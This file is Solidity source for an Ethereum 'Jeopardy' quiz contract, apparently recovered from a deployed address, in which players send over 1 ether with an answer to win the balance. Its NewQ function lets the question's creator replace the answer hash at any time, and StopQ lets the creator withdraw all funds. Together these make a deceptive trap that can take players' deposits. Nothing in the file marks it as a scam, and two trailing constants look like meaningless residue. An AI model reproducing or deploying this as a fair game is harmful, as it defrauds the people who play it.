/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Jeopardy at 0x590d1d5ba0feb249d42c527ae21d12f2e5768a87
*/
pragma solidity ^0.4.23;

contract Jeopardy
{
    bytes32 responseHash;
    string public QuizQuestion;
    address questionSender;

    function Try(string answer)
    public payable {
        if (responseHash == keccak256(answer) && msg.value > 1 ether) {
            msg.sender.transfer(address(this).balance);
        }
    }
 
    function StartQ(string question, string response)
    public payable {
        if (responseHash == 0x0) {
            responseHash = keccak256(response);
            QuizQuestion = question;
            questionSender = msg.sender;
        }
    }

    function StopQ()
    public payable {
        if (msg.sender == questionSender) {
            msg.sender.transfer(address(this).balance);
        }
    }

    function NewQ(string question, bytes32 _responseHash)
    public payable {
        if (msg.sender == questionSender) {
            QuizQuestion = question;
            responseHash = _responseHash;
        }
    }

    function () public payable { }
    uint256  versionMin = 0x006326e3367063c8166a8a6304858fef6363e3fbbd;
    uint256  versionMaj = 0x00633e3ee859631f1c827f63f50ab247633fad9ae0;
}